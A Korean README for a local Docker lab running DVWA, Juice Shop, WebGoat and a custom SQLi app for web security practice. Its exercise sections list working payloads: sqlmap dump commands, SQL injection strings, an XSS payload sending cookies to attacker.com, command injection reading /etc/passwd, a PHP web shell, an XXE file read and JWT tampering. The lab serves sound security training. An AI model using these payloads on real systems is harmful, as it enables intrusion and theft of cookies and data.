# 웹 해킹 랩 (01_web_hacking_lab)

이 랩은 OWASP Top 10 취약점을 포함한 다양한 웹 보안 취약점을 실습하기 위한 환경입니다.
DVWA, OWASP Juice Shop, WebGoat, 커스텀 SQLi 타겟 앱을 Nginx 리버스 프록시 뒤에 구성합니다.

---

## 서비스 구성

| 서비스 | 이미지 | 내부 포트 | 프록시 경로 | 설명 |
|--------|--------|-----------|------------|------|
| dvwa | vulnerables/web-dvwa | 80 | `/dvwa/` | Damn Vulnerable Web Application |
| juice-shop | bkimminich/juice-shop | 3000 | `/juice/` | OWASP Juice Shop |
| webgoat | webgoat/webgoat | 8080 | `/webgoat/` | WebGoat |
| sqlmap-target | 커스텀 Flask | 5000 | `/sqli/` | 취약한 SQLi 실습 앱 |
| proxy | nginx:1.25-alpine | 80 | — | 리버스 프록시 |

**외부 접근 포트: `http://localhost:8080`**

---

## 빠른 시작

```bash
cd labs/01_web_hacking_lab
docker compose up -d

# 상태 확인
docker compose ps

# 로그 확인
docker compose logs -f proxy
```

### 종료

```bash
docker compose down
# 볼륨 포함 삭제
docker compose down -v
```

---

## 서비스별 URL 및 기본 크리덴셜

### DVWA
- URL: `http://localhost:8080/dvwa/`
- 기본 계정: `admin` / `password`
- 최초 설치 시 `/dvwa/setup.php` 접속 후 **Create / Reset Database** 클릭 필요
- 난이도 설정: `DVWA Security` → Low / Medium / High / Impossible

### OWASP Juice Shop
- URL: `http://localhost:8080/juice/`
- 계정 생성 필요 없음 (게스트로 탐색 가능)
- Admin 계정: `admin@juice-sh.op` / `admin123`
- 총 100개 이상의 챌린지 내장

### WebGoat
- URL: `http://localhost:8080/webgoat/`
- 회원가입 후 사용: `/WebGoat/registration`
- 가이드형 학습 — 각 취약점 설명 후 실습 문제 제공

### SQLi 타겟 (커스텀 Flask)
- URL: `http://localhost:8080/sqli/`
- 계정 불필요 (GET/POST 파라미터로 직접 공격)
- 내장 플래그: 취약점 악용 시 획득 가능

---

## Burp Suite 프록시 설정 방법

### 1. Burp Suite 실행 및 리스너 확인
```
Proxy → Options → Proxy Listeners
기본값: 127.0.0.1:8080
```
> 이 랩이 8080 포트를 사용하므로 Burp 리스너를 **8888** 포트로 변경하세요.

### 2. 브라우저 프록시 설정
- **Firefox**: 설정 → 네트워크 설정 → 수동 프록시 구성
  - HTTP 프록시: `127.0.0.1`, 포트: `8888`
- **Chrome**: FoxyProxy 확장 프로그램 권장

### 3. Burp CA 인증서 설치 (HTTPS 인터셉트 시)
```
http://burp → CA Certificate 다운로드
Firefox: 설정 → 인증서 → 인증서 가져오기
```

### 4. 트래픽 인터셉트 예시
```
Proxy → Intercept → Intercept is on
→ 브라우저에서 /sqli/?id=1 요청
→ Burp에서 파라미터 확인 및 수정
→ Repeater로 전송하여 반복 테스트
```

---

## 주요 실습 과제

### 1. SQL 인젝션 (SQLi)
**대상**: SQLi 타겟 앱, DVWA

```bash
# sqlmap으로 자동 탐지
sqlmap -u "http://localhost:8080/sqli/search?id=1" --dbs
sqlmap -u "http://localhost:8080/sqli/search?id=1" -D main --tables
sqlmap -u "http://localhost:8080/sqli/search?id=1" -D main -T users --dump

# 수동 로그인 우회
# username 필드에 입력: admin'--
# password: (아무거나)

# UNION 기반 컬럼 수 확인
# id 파라미터에: 1 ORDER BY 3--
# 컬럼 출력: 0 UNION SELECT 1,username,password FROM users--
```

**챌린지**: `FLAG{sql1_1nj3ct10n_m4st3r}` 획득하기

### 2. XSS (Cross-Site Scripting)
**대상**: DVWA, Juice Shop

```javascript
// Reflected XSS
<script>alert('XSS')</script>
<img src=x onerror=alert(document.cookie)>

// Stored XSS (DVWA Guestbook)
<script>fetch('http://attacker.com/?c='+document.cookie)</script>

// DOM XSS (Juice Shop)
// URL 해시 조작: /#/search?q=<img src=x onerror=alert(1)>
```

### 3. CSRF (Cross-Site Request Forgery)
**대상**: DVWA

```html
<!-- 악성 페이지에 삽입하여 피해자가 접속 시 비밀번호 변경 -->
<img src="http://localhost:8080/dvwa/vulnerabilities/csrf/?
password_new=hacked&password_conf=hacked&Change=Change" />
```

### 4. IDOR (Insecure Direct Object Reference)
**대상**: Juice Shop

```bash
# 다른 사용자의 주문 조회
GET /api/Orders/1
GET /api/Orders/2
# → 인증 없이 타인의 주문 접근 가능 여부 확인

# 파일 다운로드 경로 조작
GET /ftp/package.json.bak
GET /ftp/acquisitions.md
```

### 5. 명령어 인젝션 (Command Injection)
**대상**: DVWA

```bash
# Ping 기능에서 명령어 주입
127.0.0.1; whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1 | ls -la /
```

### 6. 파일 업로드 취약점
**대상**: DVWA

```php
<?php system($_GET['cmd']); ?>
```
- `.php` 확장자로 웹쉘 업로드 시도
- Content-Type 변조: `image/jpeg`로 변경하여 우회
- Burp Suite로 인터셉트 후 수정

### 7. XXE (XML External Entity)
**대상**: WebGoat XXE 모듈

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

### 8. 인증 취약점 (Authentication Bypass)
**대상**: Juice Shop

```bash
# JWT 토큰 변조
# 1. 로그인 후 JWT 획득
# 2. jwt.io에서 페이로드 디코드
# 3. role: "admin" 으로 변조
# 4. 서명 알고리즘을 "none"으로 변경

# 기본 크리덴셜 시도
admin@juice-sh.op / admin123
bjoern.kimminich@gmail.com / bW9jLnJldGFocGluaW1taWsubnJlb2piBg==
```

---

## 네트워크 구성

```
[사용자 브라우저]
       |
  localhost:8080
       |
  [Nginx Proxy — 172.16.0.2]
   /dvwa/  → 172.16.0.10 (DVWA)
   /juice/ → 172.16.0.20 (Juice Shop)
   /webgoat/ → 172.16.0.30 (WebGoat)
   /sqli/  → 172.16.0.40 (SQLi Target)
```

---

## 학습 순서 권장

1. **DVWA Low** 난이도로 각 취약점 개념 이해
2. **Juice Shop**에서 자유 탐색 및 챌린지 도전
3. **WebGoat**의 설명을 읽으며 단계별 학습
4. **SQLi 타겟**에서 sqlmap 실습 및 수동 SQLi 연습
5. **DVWA Medium/High** 난이도로 우회 기법 연구

---

## 트러블슈팅

```bash
# DVWA DB 초기화 실패 시
docker compose restart dvwa-db
docker compose restart dvwa

# 포트 충돌 시 (8080 이미 사용 중)
# docker-compose.yml에서 "8080:80"을 "9090:80"으로 변경

# 컨테이너 쉘 접속
docker exec -it web_lab_dvwa bash
docker exec -it web_lab_juiceshop sh
```
